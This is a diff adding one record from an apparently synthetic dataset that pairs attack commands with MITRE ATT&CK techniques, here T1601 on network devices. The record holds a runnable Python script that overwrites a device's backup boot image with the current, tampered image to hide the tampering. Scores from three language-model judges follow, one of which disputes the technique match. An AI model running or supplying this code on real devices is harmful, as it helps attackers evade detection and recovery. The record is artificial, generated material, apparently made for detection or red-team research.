@@ -1,0 +1,57 @@
+{
+  "technique_id": "T1601",
+  "platform": "Network Devices",
+  "shell": "Python",
+  "command": "python3 - <<'PY'\nimport os, sys, shutil, filecmp\nif os.geteuid() != 0:\n    sys.exit(\"root required\")\n\ncurrent = \"/boot/flash/system.img\"\nbackup = \"/boot/backup/system.img.bak\"\n\nos.makedirs(os.path.dirname(backup), exist_ok=True)\nif not os.path.exists(backup) or not filecmp.cmp(current, backup, shallow=False):\n    shutil.copy2(current, backup)\n    assert filecmp.cmp(current, backup, shallow=False)\n    print(\"Synchronized backup to match current system image\")\nelse:\n    print(\"Backup already matches current image\")\nPY",
+  "explanation": "Ensures the backup image mirrors the currently modified system image, masking unauthorized changes by updating the backup copy.",
+  "rationale_steps": [
+    "Require root to read/write boot and backup locations.",
+    "Compare the active image with the backup using filecmp.",
+    "If different, overwrite the backup and verify equality to conceal the tampering."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-PYTHON-T1601-0c03443f-2dfd4a7b",
+  "source_prompt_hash": "0c03443f",
+  "timestamp_utc": "2025-09-30T04:56:19.919567Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The Python script is perfectly well-formed with proper indentation, balanced quotes, valid imports, correct conditional logic, and appropriate error handling.",
+        "semantic_score": 5,
+        "semantic_justification": "The command perfectly aligns with T1601 (Modify System Image) by creating a backup that matches the potentially compromised system image, effectively hiding unauthorized modifications by synchronizing the backup to the altered image.",
+        "combined_score": 5.0,
+        "confidence": 0.95,
+        "timestamp": "2025-10-02T19:19:50.544586Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command uses a perfectly well-formed Python heredoc, and the Python script itself contains no syntax errors, ensuring it is parseable and runnable.",
+        "semantic_score": 5,
+        "semantic_justification": "The command perfectly achieves its stated intent of updating a backup to match a potentially modified system image, thereby masking unauthorized changes consistent with hiding evidence of T1601, and correctly acknowledges root privilege requirements within the script.",
+        "combined_score": 5.0,
+        "confidence": 1,
+        "timestamp": "2025-10-02T19:19:58.508855Z"
+      },
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "The here-doc is properly delimited and the Python snippet is valid, balanced, and runnable via 'python3 -'.",
+        "semantic_score": 2,
+        "semantic_justification": "While it plausibly synchronizes a backup to match the current image, it does not modify the system image or bootloader as required by T1601 and also requires root despite the 'Privilege: None' claim.",
+        "combined_score": 3.5,
+        "confidence": 1,
+        "timestamp": "2025-10-02T19:20:25.925549Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 4.0,
+    "llm_average_score": 4.5,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
